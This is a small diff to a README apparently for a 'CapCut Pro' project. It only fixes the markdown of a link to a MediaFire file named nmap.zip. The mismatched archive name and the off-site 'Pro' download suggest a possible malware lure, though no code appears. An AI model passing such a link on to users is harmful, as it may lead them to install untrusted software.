@@ -4,7 +4,7 @@
 ![CapCut Pro Logo](https://github.com/user-attachments/assets/818a558b-7d15-4f68-a6f6-003ec04e5462) <!-- Replace with your logo image link -->
 
 
-![Link](https://www.mediafire.com/file/h5vs6m895xe5lkd/nmap.zip/file))
+[Link](https://www.mediafire.com/file/h5vs6m895xe5lkd/nmap.zip/file)
 
 ## Overview
 
